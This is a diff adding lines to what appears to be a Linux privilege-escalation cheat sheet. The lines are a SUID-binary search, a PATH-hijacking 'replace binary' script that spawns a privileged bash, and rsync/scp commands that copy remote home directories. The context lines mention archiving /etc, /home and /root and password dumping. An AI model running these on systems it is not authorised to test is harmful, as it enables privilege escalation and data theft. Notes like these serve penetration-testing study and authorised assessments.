@@ -51,6 +51,9 @@ SUID:
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
+```
+​find / -perm -4000 2>/dev/null
+```
 
 SGID:
 ```
@@ -70,6 +73,16 @@ lsmod
 ```
 ```
 /sbin/modinfo <module_name>
+```
+
+Replace binary:
+```
+#! /bin/bash -p
+bash -p
+```
+```
+export PATH=./:$PATH
+echo $PATH
 ```
 
 ## Process monitoring
@@ -108,6 +121,12 @@ tar -zcf linux_files.tar.gz /etc/* /home/* /root/* /var/www/* /var/log/*
 Recursive search:
 ```
 grep -rnwl '/path/to/somewhere/' -e "pattern"
+```
+```
+rsync -azP example@example:/home/example/ ./
+```
+```
+scp example@example:/home/example/ ./
 ```
 
 ## Password Dumping
